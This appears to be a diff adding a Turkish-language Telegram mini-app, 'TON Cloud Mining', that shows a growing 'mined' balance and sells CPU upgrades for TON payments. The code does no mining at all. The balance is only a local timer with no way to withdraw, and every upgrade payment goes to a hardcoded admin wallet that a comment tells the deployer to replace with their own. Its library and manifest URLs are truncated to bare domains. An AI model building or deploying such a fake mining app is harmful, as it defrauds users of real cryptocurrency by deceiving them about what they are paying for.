@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TON Cloud Mining</title>
+    <script src="https://telegram.org"></script>
+    <script src="https://unpkg.com"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0b1120;
+            color: #f8fafc;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .header { width: 100%; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .title { font-size: 18px; font-weight: 700; color: #38bdf8; }
+        .card {
+            width: 100%;
+            max-width: 420px;
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 16px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        .balance-label { font-size: 13px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }
+        .balance-value { font-size: 36px; font-weight: 800; color: #38bdf8; margin: 10px 0; font-variant-numeric: tabular-nums; }
+        .mining-badge {
+            display: inline-block;
+            background: rgba(56, 189, 248, 0.15);
+            color: #38bdf8;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-claim { background: #0284c7; color: white; }
+        .btn-claim:active { transform: scale(0.98); }
+        .btn-upgrade { background: linear-gradient(135deg, #2563eb, #06b6d4); color: white; margin-top: 12px; }
+        .btn:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; }
+        .cpu-title { font-size: 17px; font-weight: 700; margin-bottom: 6px; }
+        .cpu-sub { font-size: 14px; color: #cbd5e1; margin-bottom: 10px; }
+        .saved-box { font-size: 13px; color: #94a3b8; margin-top: 12px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="title">⛏️ TON Miner</div>
+        <div id="ton-connect"></div>
+    </div>
+
+    <div class="card">
+        <div class="balance-label">Kazılan Miktar (Anlık)</div>
+        <div class="balance-value" id="live-balance">0.0000</div>
+        <div class="mining-badge" id="cpu-badge">⚡ Seviye 1: Ücretsiz CPU (10 H/s)</div>
+        <button class="btn btn-claim" onclick="claimTokens()">Bakiyeyi Topla (Claim)</button>
+        <div class="saved-box">Toplanan Cüzdan Bakiyesi: <strong id="saved-balance" style="color:#fff;">0.0000</strong></div>
+    </div>
+
+    <div class="card">
+        <div class="cpu-title">🚀 CPU Gücünü Yükselt</div>
+        <div class="cpu-sub" id="next-cpu-text">Sonraki: Seviye 2 - Bronz CPU (35 H/s)</div>
+        <button class="btn btn-upgrade" id="upgrade-btn" onclick="buyUpgrade()">0.5 TON ile Yükselt</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        // ÖNEMLİ: Ödemelerin geleceği kendi TON cüzdan adresinizi buraya yapıştırın
+        const ADMIN_WALLET = "0:084050c528b55e7861ef3b80cc963d160ddbe77b10ea2340c2e28eed134b89de";
+
+        // Sizin GitHub Pages Manifest Dosyanız
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://github.io',
+            buttonRootId: 'ton-connect'
+        });
+
+        // Kademeli CPU Paketleri
+        const levels = [
+            { level: 1, name: "Ücretsiz CPU", hashrate: "10 H/s", speedPerSec: 0.0005, priceTON: 0 },
+            { level: 2, name: "Bronz CPU", hashrate: "35 H/s", speedPerSec: 0.0018, priceTON: 0.5 },
+            { level: 3, name: "Gümüş CPU", hashrate: "100 H/s", speedPerSec: 0.0050, priceTON: 1.5 },
+            { level: 4, name: "Altın CPU", hashrate: "300 H/s", speedPerSec: 0.0150, priceTON: 4.0 },
+            { level: 5, name: "Elmas CPU", hashrate: "1000 H/s", speedPerSec: 0.0500, priceTON: 10.0 }
+        ];
+
+        // Tarayıcı hafızasından (LocalStorage) kullanıcı verilerini yükle
+        let currentLevelIdx = parseInt(localStorage.getItem('cpu_level_idx')) || 0;
+        let savedBalance = parseFloat(localStorage.getItem('saved_balance')) || 0;
+        let lastClaimTime = parseInt(localStorage.getItem('last_claim_time')) || Date.now();
+
+        updateUI();
+
+        // Geçen zamana göre kazım miktarını hesapla
+        function getPendingMined() {
+            const elapsedSeconds = (Date.now() - lastClaimTime) / 1000;
+            return elapsedSeconds * levels[currentLevelIdx].speedPerSec;
+        }
+
+        // Ekranı saniyede 2 kez güncelle
+        setInterval(() => {
+            const pending = getPendingMined();
+            document.getElementById('live-balance').innerText = pending.toFixed(4);
+        }, 500);
+
+        // Kazılan bakiyeyi toplama
+        function claimTokens() {
+            const pending = getPendingMined();
+            if (pending < 0.0001) return;
+
+            savedBalance += pending;
+            lastClaimTime = Date.now();
+
+            localStorage.setItem('saved_balance', savedBalance.toString());
+            localStorage.setItem('last_claim_time', lastClaimTime.toString());
+
+            document.getElementById('saved-balance').innerText = savedBalance.toFixed(4);
+            document.getElementById('live-balance').innerText = "0.0000";
+            tg.HapticFeedback.notificationOccurred('success');
+        }
+
+        // TON Ödemesi ile CPU Yükseltme
+        async function buyUpgrade() {
+            if (!tonConnectUI.connected) {
+                tg.showAlert("Lütfen önce sağ üstten TON cüzdanınızı bağlayın!");
+                return;
+            }
+            if (currentLevelIdx >= levels.length - 1) return;
+
+            const nextLevel = levels[currentLevelIdx + 1];
+            const nanoTON = Math.floor(nextLevel.priceTON * 1_000_000_000).toString();
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 300,
+                messages: [
+                    {
+                        address: ADMIN_WALLET,
+                        amount: nanoTON
+                    }
+                ]
+            };
+
+            try {
+                await tonConnectUI.sendTransaction(transaction);
+                
+                // Yükseltmeden önce biriken bakiyeyi otomatik topla
+                claimTokens();
+
+                currentLevelIdx++;
+                localStorage.setItem('cpu_level_idx', currentLevelIdx.toString());
+                updateUI();
+                
+                tg.HapticFeedback.notificationOccurred('success');
+                tg.showAlert(`Tebrikler! ${nextLevel.name} (${nextLevel.hashrate}) aktif edildi!`);
+            } catch (error) {
+                tg.showAlert("Ödeme işlemi iptal edildi.");
+            }
+        }
+
+        function updateUI() {
+            const curr = levels[currentLevelIdx];
+            document.getElementById('cpu-badge').innerText = `⚡ Seviye ${curr.level}: ${curr.name} (${curr.hashrate})`;
+            document.getElementById('saved-balance').innerText = savedBalance.toFixed(4);
+
+            const upgradeBtn = document.getElementById('upgrade-btn');
+            const nextText = document.getElementById('next-cpu-text');
+
+            if (currentLevelIdx < levels.length - 1) {
+                const next = levels[currentLevelIdx + 1];
+                nextText.innerText = `Sonraki: Seviye ${next.level} - ${next.name} (${next.hashrate})`;
+                upgradeBtn.innerText = `${next.priceTON} TON ile Yükselt`;
+            } else {
+                nextText.innerText = "Maksimum CPU donanımına ulaştınız!";
+                upgradeBtn.innerText = "Maksimum Seviye";
+                upgradeBtn.disabled = true;
+            }
+        }
+    </script>
+</body>
+</html>
